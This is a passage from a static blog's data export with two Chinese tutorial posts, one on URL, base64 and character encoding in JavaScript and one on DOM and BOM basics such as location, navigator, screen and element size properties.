title=\"六、字符编码知识总结\"></a>六、字符编码知识总结</h1><ol>\n<li>所有字符集源于ASCII字符集，是单字节字符集，最开始有128个，主要包括26个英文字符和数字，及其他符号和控制符^8</li>\n<li>ASCII字符集后来扩展到256个，主要是添加了其他一些符号</li>\n<li>计算机传到亚洲，发展出多字节字符集。</li>\n<li><p>中文字符集：</p>\n<ul>\n<li>GB2312较常用，涵盖了所有简体字符以及一部分其他字符；</li>\n<li>GBK(k是扩展的意思)，在GB2312的基础上添加了繁体字</li>\n<li>GB18030 不是双字节字符集</li>\n</ul>\n</li>\n<li><p>更多ASCII衍生字符集出现后，世界各个组织进行标准化流程，ANSI组织提出ANSI标准字符编码，我们现在通常说到ANSI编码，通常指的是平台的默认编码，例如英文操作系统中是ISO-8859-1，中文系统是GBK。然后各个国家也都编写自己语言的字符集</p>\n</li>\n<li>新的需求出现了：<strong>在一份文档中显示所有字符。</strong>此时需要一个全人类达成共识的巨大的字符集，这就是 <strong>Unicode字符集</strong>，<img src=\"http://o798x2hdw.bkt.clouddn.com/stickers/11.jpeg?imageView2/1/w/100/h/100/q/100\" alt=\"sticker\"></li>\n<li>在Unicode出现之前，所有的字符集都是和具体编码方案绑定在一起的，Unicode将字符集和字符编码方案分离开。所以产生了多种不同的Unicode编码集，<strong>UTF-8是目前应用最广泛的一种Unicode编码方案</strong>。中国的GB18030编码，覆盖了Unicode所有的字符，因此也算是一种Unicode编码。</li>\n<li>Unicode字符集只是定义了字符的集合和唯一编号，Unicode编码，则是对UTF-8、UCS-2/UTF-16等具体编码方案的统称而已，并不是具体的编码方案。所以当需要用到字符编码的时候，你可以写gb2312，codepage936，utf-8，utf-16，但请不要写unicode（看过别人在网页的meta标签里头写charset=unicode，有感而发）</li>\n<li>造成 <strong>乱码</strong>的原因就是因为使用了错误的字符编码去解码字节流，因此当我们在思考任何跟文本显示有关的问题时，请时刻保持清醒：当前使用的字符编码是什么。</li>\n<li><strong>术语</strong>：编码的过程是将字符转换成字节流。 解码的过程是将字节流解析为字符。</li>\n</ol>\n<hr>\n<blockquote>\n<p>本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 <a href=\"mailto:miao.hnlk@gmail.com\" target=\"_blank\" rel=\"noopener\">miao.hnlk@gmail.com</a><br>本文地址：<a href=\"http://supermaryy.com/2016/10/30/knowledge-about-encoding-and-transcoding/\">http://supermaryy.com/2016/10/30/knowledge-about-encoding-and-transcoding/</a></p>\n</blockquote>\n<p>Reference：</p>\n<p>^1: <a href=\"http://fengqing888.blog.163.com/blog/static/330114162013101522549676/\" target=\"_blank\" rel=\"noopener\">URL编码为什么中文加%原因</a><br>^2: <a href=\"http://blog.csdn.net/java2009cgh/article/details/11214081\" target=\"_blank\" rel=\"noopener\">Unicode转义(\\uXXXX)的编码和解码</a><br>^3: <a href=\"http://www.cnblogs.com/jerrysion/p/5522673.html\" target=\"_blank\" rel=\"noopener\">为什么要进行URL编码</a><br>^4: <a href=\"http://www.cnblogs.com/shytong/p/5102256.html\" target=\"_blank\" rel=\"noopener\">encodeURI、encodeURIComponent、btoa及其应用场景</a><br>^5: <a href=\"http://www.cnblogs.com/jx270/p/4829589.html\" target=\"_blank\" rel=\"noopener\">encodeURI来解决URL传递时的中文问题</a><br>^6: <a href=\"http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/001399413803339f4bbda5c01fc479cbea98b1387390748000\" target=\"_blank\" rel=\"noopener\">base64</a><br>^7: <a href=\"http://netwjx.github.io/blog/2012/07/07/encode-and-decode-unicode-escape-string/\" target=\"_blank\" rel=\"noopener\">Unicode转义(\\uXXXX)的编码和解码</a><br>^8: <a href=\"http://www.imkevinyang.com/2010/06/%E5%85%B3%E4%BA%8E%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%EF%BC%8C%E4%BD%A0%E6%89%80%E9%9C%80%E8%A6%81%E7%9F%A5%E9%81%93%E7%9A%84.html\" target=\"_blank\" rel=\"noopener\">关于字符编码，你所需要知道的（ASCII,Unicode,Utf-8,GB2312…）</a></p>\n","site":{"data":{}},"excerpt":"<p>摘要：</p>\n<ol>\n<li>url编码%uxxxx</li>\n<li>base64</li>\n<li>unicode转义序列\\uxxxx</li>\n<li>字符编码知识：ASCII,Unicode,Utf-8,GB2312,GBK</li>\n</ol>","more":"<blockquote>\n<p>by MaryTien from  <a href=\"http://luckymona.github.com\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com</a><br>本文地址：<a href=\"http://supermaryy.com/2016/10/30/knowledge-about-encoding-and-transcoding/\">http://supermaryy.com/2016/10/30/knowledge-about-encoding-and-transcoding/</a></p>\n</blockquote>\n<h1 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h1><p>自从学前端以来，关于编码和转码这一块的知识，不论是书还是博客，从来没有看到过作系统介绍的文章，自己也都是三不五时零碎地遇到这方面的问题，加上这块的知识也挺复杂琐碎的，所以一直都比较糊涂，于是在这个深圳刚刚降温，秋高气爽的下午，无比地需要写上这么一篇总结啦啦啦。总结来自于网上资料整理和自己的浅薄经验，比较肤浅，等我把肤浅的东西弄熟之后再添加深入的东西(ง •̀_•́ )ง</p>\n<h1 id=\"二、url编码-uxxxx\"><a href=\"#二、url编码-uxxxx\" class=\"headerlink\" title=\"二、url编码%uxxxx\"></a>二、url编码%uxxxx</h1><ol>\n<li><p>%uxxxx是url编码的结果</p>\n</li>\n<li><p>为什么要进行URL编码?<br>【文档标准】<br>RFC3986文档规定，Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符。RFC3986文档对Url的编解码问题做出了详细的建议，指出了哪些字符需要被编码才不会引起Url语义的转变，以及对为什么这些字符需要编码做出了相应的解释。<br>HTTP协议中通过URL传参是通过键值对形式进行的，格式上是以？、&amp;和=为特征标识进行解析，如果键或者值的内容中包含这些符号，就会造成解析错误，所以要进行编码，用不会造成歧义的符号代替有歧义的符号。</p>\n</li>\n<li><p>编码方式：<br>在特殊字符前加上%，例如“name1=value1”,其中value1的值是“va&amp;lu=e1”，对其进行URL编码后：“name1=va%26lu%3D”，这样服务端会把紧跟在“%”后的字节当成普通的字节，就是不会把它当成各个参数或键值对的分隔符。因此，Url编码通常也被称为百分号编码</p>\n</li>\n<li><p>为什么汉字也要进行编码：URL中的传参字符串是ASCII编码而非unicode，所以URL中不能包含任何非ASCII字符，否则可能出问题。</p>\n</li>\n<li><p>JS中的escape()和encodeURI()的区别：<br>escape()是把非ASCII字符先进行unicode编码，然后把四位十六进制字符前面加%，这种方式已经被W3C废弃，而后个是把非ASCII字符先进行UTF-8编码，然后加百分号，这是RFC推荐的，所以现在对url编码都是使用encodeURI了。<br>escape()不能直接用于URL编码，它的真正作用是返回一个字符的Unicode编码值。比如“春节”的返回结果是%u6625%u8282，也就是说在Unicode字符集中，“春”是第6625个（十六进制）字符，“节”是第8282个（十六进制）字符。</p>\n</li>\n<li><p>encodeURI和encodeURIComponent的区别：<br>encodeURI()对完整的URI编码，后者对URI的一个组件进行编码。这样分隔URI组件的那些特殊符号不会被encodeURI编码，但如果使用encodeURIComponent()，就会进行编码。需要注意的是，encodeURI不会对单引号进行编码</p>\n</li>\n<li><p>什么时候使用encodeURI()？四种涉及URL编码的场景，及该场景下的编码方式^1：</p>\n<ul>\n<li>网址路径中包含汉字【UTF-8】</li>\n<li>网址的查询字符串包含汉字【操作系统编码】</li>\n<li>Get方法生成的URL包含汉字，在已打开的网页上，直接用Get或Post方法发出HTTP请求，例form方式：【meta标签的charset属性定义的编码】</li>\n<li>Ajax调用的URL包含汉字:【不同浏览器的编码方式不同】<br>对包含中文的URL的处理问题，不同浏览器表现不同，很混乱，保证客户端只用一种编码方法向服务器发出请求的解决方案：使用Javascript先对URL编码，然后再向服务器提交，不要给浏览器插手的机会。因为Javascript的输出总是一致的，所以就保证了服务器得到的数据是格式统一的。</li>\n</ul>\n</li>\n<li><p>出现乱码问题时的排查：</p>\n<ul>\n<li>检查编辑器保存文件的字符集，和<meta>标签中指定的字符集是否一致</li>\n<li>两次encodeURI后提交给后台，解决后台收到乱码的问题^5</li>\n<li>服务器返回的响应头Content-Type没有指明字符编码</li>\n</ul>\n</li>\n<li><p>win7操作系统默认编码是gbk，winXP是gb2312</p>\n</li>\n</ol>\n<h1 id=\"三、base64编码\"><a href=\"#三、base64编码\" class=\"headerlink\" title=\"三、base64编码\"></a>三、base64编码</h1><ol>\n<li><p>base64是什么？^6<br>base是二进制到文本字符串的转换方法，常用于在URL、Cookie、网页中传输少量二进制数据。</p>\n</li>\n<li><p>为什么要进行base64编码：<br>用记事本打开pdf、exe、jpg等文件时，会显示乱码，因为二进制有许多不能显示的字符，如果想让记事本可以打开二进制文件，就需要把二进制转换成字符串，base64是常见的二进制转换方法。</p>\n</li>\n<li><p>什么时候进行base64编码：</p>\n<ul>\n<li>上传图片、文件时</li>\n<li>拼URL的时候，base64编码后，肉眼看不出信息</li>\n</ul>\n</li>\n<li><p>其他：</p>\n<ul>\n<li>Base64编码会把3字节的二进制数据编码为4字节的文本数据，长度增加33%，好处是编码后的文本数据可以在邮件正文、网页等直接显示。</li>\n<li>Base64是一种通过查表的编码方法，不能用于加密，即使使用自定义的编码表也不行</li>\n</ul>\n</li>\n<li><p>JS自带的base64转换方法：btoa()和atob()<br>负责ASCII字符串或二进制数据与base64编码的相互转换。命名与实际作用相反：</p>\n<ul>\n<li>btoa：按名字理解是base64到ASCII字符串或二进制数据呗，但实际作用是反过来。该方法不能直接作用于Unicode字符串，所以如果btoa(‘你好’)，会报错。</li>\n<li>atob：对base64码进行解码。</li>\n<li>如果要对中文进行base64编码，只需要将中文进行encodeURIComponent进行编码之后再进行 base64编码即可。</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"四、-unnnn是什么\"><a href=\"#四、-unnnn是什么\" class=\"headerlink\" title=\"四、\\unnnn是什么\"></a>四、\\unnnn是什么</h1><p>\\unnnn有两种含义：</p>\n<ol>\n<li>\\unnnn字符串的字符字面量，又叫转义序列，还包括\\ntbrf、\\、\\’、\\”、\\xnn，nnnn是四位16进制数表示的unicode字符，</li>\n<li>正则表达式元字符:<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var str = &quot;Visit W3Schools. Hello World!&quot;;</span><br><span class=\"line\">var patt1 = /\\u0057/g;</span><br><span class=\"line\">var result = str.match(patt1);   //W,W</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>可以利用nnnn是unicode编码，和escape(),unescape()来进行编码和解码^7</p>\n<h1 id=\"五、总结以上\"><a href=\"#五、总结以上\" class=\"headerlink\" title=\"五、总结以上\"></a>五、总结以上</h1><ol>\n<li>URL中的传参字符串必须是ASCII编码</li>\n<li>escape()：是把非ASCII字符先进行unicode编码，加%，已废弃。不能直接用于URL编码，它的真正作用是返回一个字符的Unicode编码值</li>\n<li>encodeURI：把非ASCII字符先进行UTF-8编码，然后加百分号，推荐！</li>\n<li>btoa()和atob()负责ASCII字符串或二进制数据转换成一个base64，不能对unicode字符（如中文）使用，会报错</li>\n</ol>\n<h1 id=\"六、字符编码知识总结\"><a href=\"#六、字符编码知识总结\" class=\"headerlink\" title=\"六、字符编码知识总结\"></a>六、字符编码知识总结</h1><ol>\n<li>所有字符集源于ASCII字符集，是单字节字符集，最开始有128个，主要包括26个英文字符和数字，及其他符号和控制符^8</li>\n<li>ASCII字符集后来扩展到256个，主要是添加了其他一些符号</li>\n<li>计算机传到亚洲，发展出多字节字符集。</li>\n<li><p>中文字符集：</p>\n<ul>\n<li>GB2312较常用，涵盖了所有简体字符以及一部分其他字符；</li>\n<li>GBK(k是扩展的意思)，在GB2312的基础上添加了繁体字</li>\n<li>GB18030 不是双字节字符集</li>\n</ul>\n</li>\n<li><p>更多ASCII衍生字符集出现后，世界各个组织进行标准化流程，ANSI组织提出ANSI标准字符编码，我们现在通常说到ANSI编码，通常指的是平台的默认编码，例如英文操作系统中是ISO-8859-1，中文系统是GBK。然后各个国家也都编写自己语言的字符集</p>\n</li>\n<li>新的需求出现了：<strong>在一份文档中显示所有字符。</strong>此时需要一个全人类达成共识的巨大的字符集，这就是 <strong>Unicode字符集</strong>，<img src=\"http://o798x2hdw.bkt.clouddn.com/stickers/11.jpeg?imageView2/1/w/100/h/100/q/100\" alt=\"sticker\"></li>\n<li>在Unicode出现之前，所有的字符集都是和具体编码方案绑定在一起的，Unicode将字符集和字符编码方案分离开。所以产生了多种不同的Unicode编码集，<strong>UTF-8是目前应用最广泛的一种Unicode编码方案</strong>。中国的GB18030编码，覆盖了Unicode所有的字符，因此也算是一种Unicode编码。</li>\n<li>Unicode字符集只是定义了字符的集合和唯一编号，Unicode编码，则是对UTF-8、UCS-2/UTF-16等具体编码方案的统称而已，并不是具体的编码方案。所以当需要用到字符编码的时候，你可以写gb2312，codepage936，utf-8，utf-16，但请不要写unicode（看过别人在网页的meta标签里头写charset=unicode，有感而发）</li>\n<li>造成 <strong>乱码</strong>的原因就是因为使用了错误的字符编码去解码字节流，因此当我们在思考任何跟文本显示有关的问题时，请时刻保持清醒：当前使用的字符编码是什么。</li>\n<li><strong>术语</strong>：编码的过程是将字符转换成字节流。 解码的过程是将字节流解析为字符。</li>\n</ol>\n<hr>\n<blockquote>\n<p>本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 <a href=\"mailto:miao.hnlk@gmail.com\" target=\"_blank\" rel=\"noopener\">miao.hnlk@gmail.com</a><br>本文地址：<a href=\"http://supermaryy.com/2016/10/30/knowledge-about-encoding-and-transcoding/\">http://supermaryy.com/2016/10/30/knowledge-about-encoding-and-transcoding/</a></p>\n</blockquote>\n<p>Reference：</p>\n<p>^1: <a href=\"http://fengqing888.blog.163.com/blog/static/330114162013101522549676/\" target=\"_blank\" rel=\"noopener\">URL编码为什么中文加%原因</a><br>^2: <a href=\"http://blog.csdn.net/java2009cgh/article/details/11214081\" target=\"_blank\" rel=\"noopener\">Unicode转义(\\uXXXX)的编码和解码</a><br>^3: <a href=\"http://www.cnblogs.com/jerrysion/p/5522673.html\" target=\"_blank\" rel=\"noopener\">为什么要进行URL编码</a><br>^4: <a href=\"http://www.cnblogs.com/shytong/p/5102256.html\" target=\"_blank\" rel=\"noopener\">encodeURI、encodeURIComponent、btoa及其应用场景</a><br>^5: <a href=\"http://www.cnblogs.com/jx270/p/4829589.html\" target=\"_blank\" rel=\"noopener\">encodeURI来解决URL传递时的中文问题</a><br>^6: <a href=\"http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/001399413803339f4bbda5c01fc479cbea98b1387390748000\" target=\"_blank\" rel=\"noopener\">base64</a><br>^7: <a href=\"http://netwjx.github.io/blog/2012/07/07/encode-and-decode-unicode-escape-string/\" target=\"_blank\" rel=\"noopener\">Unicode转义(\\uXXXX)的编码和解码</a><br>^8: <a href=\"http://www.imkevinyang.com/2010/06/%E5%85%B3%E4%BA%8E%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%EF%BC%8C%E4%BD%A0%E6%89%80%E9%9C%80%E8%A6%81%E7%9F%A5%E9%81%93%E7%9A%84.html\" target=\"_blank\" rel=\"noopener\">关于字符编码，你所需要知道的（ASCII,Unicode,Utf-8,GB2312…）</a></p>"},{"title":"Javascript基础","date":"2016-09-11T11:10:00.000Z","toc":true,"comments":1,"_content":"摘要：\n\n0. JS三个组成部分：ECMAScript 、DOM、BOM；\n1. DOM三级分别定义了什么；\n2. BOM主要定义了什么；\n3. BOM对象location、navigator、screen各自的属性和方法；\n4. If-Modified-Since；\n5. replace方法的特殊之处；\n6. screen、window、document概念区分及宽高属性获取；\n7. clientHeight / offsetHeight / scrollHeight 三者区分；\n8. 怎么判断是否滚到底； \n\n<!-- more -->\n\n> by MaryTien from  [http://supermaryy.com](http://supermaryy.com)\n> 本文地址：[http://supermaryy.com/2016/09/11/read-book-professional-javascript1](http://luckymona.github.io/2016/09/11/read-book-professional-javascript1)\n\n# 一、Javascript基础 #\n## 1. Javascript由ECMAScript\\DOM\\BOM 组成##\nECMAScript规定了这门语言的基础语法，Web浏览器只是ECMAScript的宿主环境之一，其他实现还有NodeJS、AS。\n## 2. DOM##\nDocument Object Model，文档对象模型，定义了访问和操作网页内容的接口和方法\n\n- DOM一级，它把html文档映射为节点树，\n- DOM二级定义了操作节点的方法范围和遍历、鼠标和用户界面事件、操纵css的方法：\n\n    - DOM视图（DOM Views）\n    - DOM事件（DOM Events）\n    - DOM样式（DOM Styles）\n    - DOM范围和遍历（DOM Traversal and Range）\n\n- DOM三级进一步扩展，新增DOM加载和保存模块（DOM Load and save），DOM验证模块（DOM Validation）\n\n## 3.BOM ##\nBrowser Object Model，定义与浏览器交互的接口方法。主要包括：\n\n- 弹出新窗口`window.open();`\n- 对窗口进行移动、缩放、关闭 `window.moveTo(); window.resizeTo(); window.close();`\n- location对象，所加载网页的信息\n- navigator对象，浏览器版本信息\n- screen对象，提供屏幕分辨率信息\n\n### 3.1 BOM之location对象 ###\n\n- 访问方式window.location，\n- 属性：hash（得到URL从#开始的字符串），host，hostname，href，pathname，port，protocol，search（得到URL从?开始的字符串）\n- 方法：assign、reload、replace\n\n#### assign方法： ####\nwindow.location.assign(URL),会在当前窗口加载另一个文档\n```\n<script type=\"text/javascript\">\n    function assign(){\n        window.location.assign('anotherDoc.html');\n    }\n        \n</script>\n\n<p onclick=\"assign()\">hello</p>\n```\n#### reload方法： ####\nwindow.location.reload(flase||force),可以模拟浏览器的刷新按钮\n- 参数值为false或不填，效果与浏览器刷新按钮一样，使用http头If-Modified-Since检测服务器上的文档有没有改变，没有改变就把浏览器缓存文件显示到浏览器中，如果改变了从服务器加载\n- 参数为force，效果与shift+浏览器刷新按钮，相同，强制从服务器加载\n#### http头If-Modified-Since实现浏览器缓存 ####\n发送请求时，写在http request header里面，如果页面是第一次加载则不写这个参数，第一次请求回来后，服务器返回200，并在response header中会返回一个Last-Modified，这是一个时间戳，代表请求的文件在服务器中最后修改的时间。浏览器会把这个时间戳和请求来的资源缓存下来，这时，按浏览器的刷新按钮之后，发起第二次请求，会在request header中加上If-Modified-Since这个字段，值为刚才的Last-Modified值，服务器收到请求就把IMS值与服务器上的Last-Modified值做对比，如果相同，证明文件没有发生改变，就返回304(Not Modified)，浏览器就从本地缓存加载文件，如果不相同，证明服务器上的文件已经改变，就返回200，浏览器显示请求回的新内容。\n#### replace方法： ####\nwindow.location.replace(newURL)，加载新URL的文档内容，新URL将覆盖History对象中的当前记录，也就是不会产生新历史记录。想不到什么场景会需要这个功能，查了一下，有一种场景是^1，严格限制用户操作时，为防止后退后重复提交，可以在跳转时使用replace，这样就不能后退，防止重复提交。\n\n#### 重定向方法总结 ####\nwindow.location.href = newURL;\nwindow.location.assign(newURL);\nwindow.location.replace(newURL); 附加作用：不产生新History记录\n\n### 3.2 BOM之Navigator对象 ###\n1. 自认为比较有用的属性：plugins，userAgent，cookieEnabled，appVersion,onLine,都是只读的属性，使用方法：\n`window.navigator.plugins`\n2. 一个迷思：我系统是win7 64位，然后我用window.navigator.platform，出来是\"win32\"\n查到`With windows xp64-bit, it depends if you have Internet Explorer 64-bit. If it's the case: Win64. If it's the normal edition: Win32.`^2\n3. platform这个属性不是很可靠，定义经常变动^3，这个属性使用场景是，修改它以模拟不同系统^4\n\n### 3.3 BOM之Screen对象 ###\n使用方法：`window.screen.height`，window可以省略不写\n重要属性：\n`screen.availHeight`、`screen.availWidth`、`screen.height`、`screen.width`\n#### screen、window、document概念区分及宽高属性获取： ####\n\n**1. screen**：指屏幕，屏幕的概念就是显示器、显示屏，所以这里`screen.width\\screen.height`指的是整个屏幕的宽高，就是显示器的发光的这块宽高，而`screen.availWidth\\screen.availHeight`指的是window可获取的宽高，具体来说，一般情况下，availHeight是屏幕高度减去windows系统任务栏的高度（如下图），如果你把这个任务栏放在了左右某一侧，那么screen.availHeight===screen.height，这时候availWidth等于screen.width减去任务栏占去的宽度\n![availHeight](http://o798x2hdw.bkt.clouddn.com/screen_availH.png?imageView/2/w/500/q/90)\n\n**2. window**：指窗口，一个屏幕上可以有多个窗口,关于宽高有两个属性:`window.innerHeight / window.outerHeight`:![window_innerW](http://o798x2hdw.bkt.clouddn.com/window_innerW.png?imageView/2/w/500/q/90)\n\njquery中$(window)[0] ===window, \n`$(window).width() / $(window).height();`不包括滚动条宽度/高度，\n`window.innerWidth / window.innerheight`包括滚动条宽度/高度\n\n![jquery_window_width](http://o798x2hdw.bkt.clouddn.com/jquery_window_width.png)\n\n**3. document**:指文档，\n\ndocument.body.clientHeight：body元素的宽高\ndocument.documentElement.clientHeight：视口，不包含滚动条，等于window.innerHeight减去滚动条高度\n\n#### 几种size辨析 ####\n**1. client size**^5\n>Element.clientHeight read-only property is zero for elements with no CSS or inline layout boxes, otherwise it's  the inner height of an element in pixels, including padding but not the horizontal scrollbar height, border, or margin.\n\n凡是client size，包含padding，不包含滚动条、边框、margin:\n![Dimensions-client](http://o798x2hdw.bkt.clouddn.com/Dimensions-client.png)\n\n**2.offset size**\n\n>The HTMLElement.offsetHeight read-only property is the height of the element including vertical padding and borders, in pixels, as an integer.\n\n凡是offset size，包含border和padding\n![Dimensions-offset](http://o798x2hdw.bkt.clouddn.com/Dimensions-offset.png)\n\n**3.scroll size**\n\n>The Element.scrollHeight read-only attribute is a measurement of the height of an element's content, including content not visible on the screen due to overflow.\n\nElement.scrollHeight：包含因滚动而不可见部分的整体高度\n![Dimensions-scroll](http://o798x2hdw.bkt.clouddn.com/Dimensions-scroll.png)\n\n用这个公式判断是否滚到底部了，使用场景是“我已经阅读了xxx”：\n`element.scrollHeight - element.scrollTop === element.clientHeight`\n\n\n\n\n> 本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 miao.hnlk@gmail.com\n> 本文地址：本文地址：[http://supermaryy.com/2016/09/11/read-book-professional-javascript1](http://luckymona.github.io/2016/09/11/read-book-professional-javascript1)\n\n参考链接：\n\n^1:[通过location.replace禁止浏览器后退防止重复提交](http://www.jb51.net/article/54781.htm)\n^2:[Don’t forget navigator.platform](https://www.nczonline.net/blog/2007/12/17/don-t-forget-navigator-platform/)\n^3:[What is the list of possible values for navigator.platform as of today?](http://stackoverflow.com/questions/19877924/what-is-the-list-of-possible-values-for-navigator-platform-as-of-today)\n^4:[如何修改游览器的navigator.platform属性？](https://www.zhihu.com/question/36609103)\n^5:[MDN Element.clientHeight](https://developer.mozilla.org/en-US/docs/Web/API/Element/clientHeight)\n\n","source":"_posts/read-book-professional-javascript1.md","raw":"---\ntitle: Javascript基础\ndate: 2016-09-11 19:10:00\ncategories: Javascript\ntags: [Javascript,红皮书] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n摘要：\n\n0. JS三个组成部分：ECMAScript 、DOM、BOM；\n1. DOM三级分别定义了什么；\n2. BOM主要定义了什么；\n3. BOM对象location、navigator、screen各自的属性和方法；\n4. If-Modified-Since；\n5. replace方法的特殊之处；\n6. screen、window、document概念区分及宽高属性获取；\n7. clientHeight / offsetHeight / scrollHeight 三者区分；\n8. 怎么判断是否滚到底； \n\n<!-- more -->\n\n> by MaryTien from  [http://supermaryy.com](http://supermaryy.com)\n> 本文地址：[http://supermaryy.com/2016/09/11/read-book-professional-javascript1](http://luckymona.github.io/2016/09/11/read-book-professional-javascript1)\n\n# 一、Javascript基础 #\n## 1. Javascript由ECMAScript\\DOM\\BOM 组成##\nECMAScript规定了这门语言的基础语法，Web浏览器只是ECMAScript的宿主环境之一，其他实现还有NodeJS、AS。\n## 2. DOM##\nDocument Object Model，文档对象模型，定义了访问和操作网页内容的接口和方法\n\n- DOM一级，它把html文档映射为节点树，\n- DOM二级定义了操作节点的方法范围和遍历、鼠标和用户界面事件、操纵css的方法：\n\n    - DOM视图（DOM Views）\n    - DOM事件（DOM Events）\n    - DOM样式（DOM Styles）\n    - DOM范围和遍历（DOM Traversal and Range）\n\n- DOM三级进一步扩展，新增DOM加载和保存模块（DOM Load and save），DOM验证模块（DOM Validation）\n\n## 3.BOM ##\nBrowser Object Model，定义与浏览器交互的接口方法。主要包括：\n\n- 弹出新窗口`window.open();`\n- 对窗口进行移动、缩放、关闭 `window.moveTo(); window.resizeTo(); window.close();`\n- location对象，所加载网页的信息\n- navigator对象，浏览器版本信息\n- screen对象，提供屏幕分辨率信息\n\n### 3.1 BOM之location对象 ###\n\n- 访问方式window.location，\n- 属性：hash（得到URL从#开始的字符串），host，hostname，href，pathname，port，protocol，search（得到URL从?开始的字符串）\n- 方法：assign、reload、replace\n\n#### assign方法： ####\nwindow.location.assign(URL),会在当前窗口加载另一个文档\n```\n<script type=\"text/javascript\">\n    function assign(){\n        window.location.assign('anotherDoc.html');\n    }\n        \n</script>\n\n<p onclick=\"assign()\">hello</p>\n```\n#### reload方法： ####\nwindow.location.reload(flase||force),可以模拟浏览器的刷新按钮\n- 参数值为false或不填，效果与浏览器刷新按钮一样，使用http头If-Modified-Since检测服务器上的文档有没有改变，没有改变就把浏览器缓存文件显示到浏览器中，如果改变了从服务器加载\n- 参数为force，效果与shift+浏览器刷新按钮，相同，强制从服务器加载\n#### http头If-Modified-Since实现浏览器缓存 ####\n发送请求时，写在http request header里面，如果页面是第一次加载则不写这个参数，第一次请求回来后，服务器返回200，并在response header中会返回一个Last-Modified，这是一个时间戳，代表请求的文件在服务器中最后修改的时间。浏览器会把这个时间戳和请求来的资源缓存下来，这时，按浏览器的刷新按钮之后，发起第二次请求，会在request header中加上If-Modified-Since这个字段，值为刚才的Last-Modified值，服务器收到请求就把IMS值与服务器上的Last-Modified值做对比，如果相同，证明文件没有发生改变，就返回304(Not Modified)，浏览器就从本地缓存加载文件，如果不相同，证明服务器上的文件已经改变，就返回200，浏览器显示请求回的新内容。\n#### replace方法： ####\nwindow.location.replace(newURL)，加载新URL的文档内容，新URL将覆盖History对象中的当前记录，也就是不会产生新历史记录。想不到什么场景会需要这个功能，查了一下，有一种场景是^1，严格限制用户操作时，为防止后退后重复提交，可以在跳转时使用replace，这样就不能后退，防止重复提交。\n\n#### 重定向方法总结 ####\nwindow.location.href = newURL;\nwindow.location.assign(newURL);\nwindow.location.replace(newURL); 附加作用：不产生新History记录\n\n### 3.2 BOM之Navigator对象 ###\n1. 自认为比较有用的属性：plugins，userAgent，cookieEnabled，appVersion,onLine,都是只读的属性，使用方法：\n`window.navigator.plugins`\n2. 一个迷思：我系统是win7 64位，然后我用window.navigator.platform，出来是\"win32\"\n查到`With windows xp64-bit, it depends if you have Internet Explorer 64-bit. If it's the case: Win64. If it's the normal edition: Win32.`^2\n3. platform这个属性不是很可靠，定义经常变动^3，这个属性使用场景是，修改它以模拟不同系统^4\n\n### 3.3 BOM之Screen对象 ###\n使用方法：`window.screen.height`，window可以省略不写\n重要属性：\n`screen.availHeight`、`screen.availWidth`、`screen.height`、`screen.width`\n#### screen、window、document概念区分及宽高属性获取： ####\n\n**1. screen**：指屏幕，屏幕的概念就是显示器、显示屏，所以这里`screen.width\\screen.height`指的是整个屏幕的宽高，就是显示器的发光的这块宽高，而`screen.availWidth\\screen.availHeight`指的是window可获取的宽高，具体来说，一般情况下，availHeight是屏幕高度减去windows系统任务栏的高度（如下图），如果你把这个任务栏放在了左右某一侧，那么screen.availHeight===screen.height，这时候availWidth等于screen.width减去任务栏占去的宽度\n![availHeight](http://o798x2hdw.bkt.clouddn.com/screen_availH.png?imageView/2/w/500/q/90)\n\n**2. window**：指窗口，一个屏幕上可以有多个窗口,关于宽高有两个属性:`window.innerHeight / window.outerHeight`:![window_innerW](http://o798x2hdw.bkt.clouddn.com/window_innerW.png?imageView/2/w/500/q/90)\n\njquery中$(window)[0] ===window, \n`$(window).width() / $(window).height();`不包括滚动条宽度/高度，\n`window.innerWidth / window.innerheight`包括滚动条宽度/高度\n\n![jquery_window_width](http://o798x2hdw.bkt.clouddn.com/jquery_window_width.png)\n\n**3. document**:指文档，\n\ndocument.body.clientHeight：body元素的宽高\ndocument.documentElement.clientHeight：视口，不包含滚动条，等于window.innerHeight减去滚动条高度\n\n#### 几种size辨析 ####\n**1. client size**^5\n>Element.clientHeight read-only property is zero for elements with no CSS or inline layout boxes, otherwise it's  the inner height of an element in pixels, including padding but not the horizontal scrollbar height, border, or margin.\n\n凡是client size，包含padding，不包含滚动条、边框、margin:\n![Dimensions-client](http://o798x2hdw.bkt.clouddn.com/Dimensions-client.png)\n\n**2.offset size**\n\n>The HTMLElement.offsetHeight read-only property is the height of the element including vertical padding and borders, in pixels, as an integer.\n\n凡是offset size，包含border和padding\n![Dimensions-offset](http://o798x2hdw.bkt.clouddn.com/Dimensions-offset.png)\n\n**3.scroll size**\n\n>The Element.scrollHeight read-only attribute is a measurement of the height of an element's content, including content not visible on the screen due to overflow.\n\nElement.scrollHeight：包含因滚动而不可见部分的整体高度\n![Dimensions-scroll](http://o798x2hdw.bkt.clouddn.com/Dimensions-scroll.png)\n\n用这个公式判断是否滚到底部了，使用场景是“我已经阅读了xxx”：\n`element.scrollHeight - element.scrollTop === element.clientHeight`\n\n\n\n\n> 本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 miao.hnlk@gmail.com\n> 